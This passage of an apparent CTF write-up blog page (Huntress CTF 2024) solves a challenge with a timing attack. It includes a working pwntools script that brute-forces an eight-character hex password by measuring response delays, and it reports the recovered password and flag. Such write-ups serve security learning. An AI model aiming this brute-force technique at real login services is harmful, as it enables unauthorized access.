+</span></span><span class="line"><span class="cl"><span class="n">lines</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">guess</span> <span class="o">=</span> <span class="s2">&#34;12345678&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">guess</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl"><span class="n">recv</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Guess: &#34;</span><span class="p">,</span><span class="n">guess</span> <span class="p">,</span> <span class="n">recv</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/huntress-ctf-2024/guess.png" title="alt text" data-thumbnail="/huntress-ctf-2024/guess.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/guess.png"
+            srcset="/huntress-ctf-2024/guess.png, /huntress-ctf-2024/guess.png 1.5x, /huntress-ctf-2024/guess.png 2x"
+            sizes="auto"
+            alt="alt text" height="248"  width="976" >
+    </a></figure></p>
+<p>Since we have a 90 second window to guess, we can run a brute-force by looping through every hex character and observe the response delay using this flow.</p>
+<p><figure><a class="lightgallery" href="/huntress-ctf-2024/initial-loop.png" title="alt text" data-thumbnail="/huntress-ctf-2024/initial-loop.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/initial-loop.png"
+            srcset="/huntress-ctf-2024/initial-loop.png, /huntress-ctf-2024/initial-loop.png 1.5x, /huntress-ctf-2024/initial-loop.png 2x"
+            sizes="auto"
+            alt="alt text" height="374"  width="872" >
+    </a></figure></p>
+<p>So if the observed response increased from the previous ones we find the first character. We append the character to the current guess and continue the loop</p>
+<blockquote>
+<p>Continue this until we find the correct password</p>
+</blockquote>
+<p><figure><a class="lightgallery" href="/huntress-ctf-2024/final-loop.png" title="alt text" data-thumbnail="/huntress-ctf-2024/final-loop.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/final-loop.png"
+            srcset="/huntress-ctf-2024/final-loop.png, /huntress-ctf-2024/final-loop.png 1.5x, /huntress-ctf-2024/final-loop.png 2x"
+            sizes="auto"
+            alt="alt text" height="355"  width="1029" >
+    </a></figure></p>
+<p>We can add this logic to the initial script to brute-force. The brute-force logic would look something like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">max_time</span> <span class="o">=</span> <span class="mf">0.35</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Bruteforcing...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s2">&#34;0123456789abcdef&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># guess placeholder </span>
+</span></span><span class="line"><span class="cl">        <span class="n">guess</span> <span class="o">=</span> <span class="p">(</span><span class="n">password</span><span class="o">+</span><span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&#34;_&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># time the response</span>
+</span></span><span class="line"><span class="cl">        <span class="n">before</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">guess</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">recv</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">after</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>        
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">guess</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">recv</span><span class="p">,</span> <span class="n">after</span><span class="o">-</span><span class="n">before</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># check if response exceeds the usual time</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">after</span><span class="o">-</span><span class="n">before</span> <span class="o">&gt;</span> <span class="n">max_time</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">max_time</span> <span class="o">=</span> <span class="n">max_time</span> <span class="o">+</span> <span class="mf">0.1</span>
+</span></span><span class="line"><span class="cl">            <span class="n">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">+</span><span class="n">c</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;password:&#34;</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">recv</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">recv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Note that for max_time varies on the average connection response. during my tries it looks like the incorrect response would take <code>0.29</code> seconds and <code>0.39</code> seconds if it is correct. so i set the <code>max_time</code> to <code>0.35</code> initially. It is also important to increase <code>max_time</code> as it would increase the delay the more correct characters we have.</p>
+</blockquote>
+<p>When we run the script and we can see it started guessing initial character as <code>3</code> as the response time increased to <code>0.38+secs</code>
+<figure><a class="lightgallery" href="/huntress-ctf-2024/output-time.png" title="alt text" data-thumbnail="/huntress-ctf-2024/output-time.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/output-time.png"
+            srcset="/huntress-ctf-2024/output-time.png, /huntress-ctf-2024/output-time.png 1.5x, /huntress-ctf-2024/output-time.png 2x"
+            sizes="auto"
+            alt="alt text" height="345"  width="746" >
+    </a></figure></p>
+<p>After a while we can see the script works and we find the correct password <code>38aacb77</code> and get the flag.
+<figure><a class="lightgallery" href="/huntress-ctf-2024/output-flag.png" title="alt text" data-thumbnail="/huntress-ctf-2024/output-flag.png">
+        <img
+            
+            loading="lazy"
+            src="/huntress-ctf-2024/output-flag.png"
+            srcset="/huntress-ctf-2024/output-flag.png, /huntress-ctf-2024/output-flag.png 1.5x, /huntress-ctf-2024/output-flag.png 2x"
+            sizes="auto"
+            alt="alt text" height="517"  width="1158" >
+    </a></figure></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-11-03</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="https://xeunwa.github.io/huntress-ctf-2024/" data-title="Huntress CTF 2024 - writeups" data-hashtags="Python,CVE-2020-14343,CVE-2022-22817,Insecure-Deserialization,Command-Injection,Code-Review,SQLi,Filter-Bypass,File-Upload,Timing-Attack"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Instapaper" data-sharer="instapaper" data-url="https://xeunwa.github.io/huntress-ctf-2024/" data-title="Huntress CTF 2024 - writeups" data-description="PyYAML, ZipSlip, SQLi to pickleRCE, Timing Attack"><span data-svg-src="/lib/simple-icons/icons/instapaper.min.svg"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/python/">Python</a>,&nbsp;<a href="/tags/cve-2020-14343/">CVE-2020-14343</a>,&nbsp;<a href="/tags/cve-2022-22817/">CVE-2022-22817</a>,&nbsp;<a href="/tags/insecure-deserialization/">Insecure-Deserialization</a>,&nbsp;<a href="/tags/command-injection/">Command Injection</a>,&nbsp;<a href="/tags/code-review/">Code Review</a>,&nbsp;<a href="/tags/sqli/">SQLi</a>,&nbsp;<a href="/tags/filter-bypass/">Filter-Bypass</a>,&nbsp;<a href="/tags/file-upload/">File-Upload</a>,&nbsp;<a href="/tags/timing-attack/">Timing-Attack</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/nahamcon-ctf-2024/" class="prev" rel="prev" title="NahamCon CTF 2024 - writeups"><i class="fas fa-angle-left fa-fw"></i>NahamCon CTF 2024 - writeups</a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.131.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"data":{"desktop-header-typeit":"xeunwa","mobile-header-typeit":"xeunwa"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":300,"threshold":0.1,"type":"fuse","useExtendedSearch":false},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
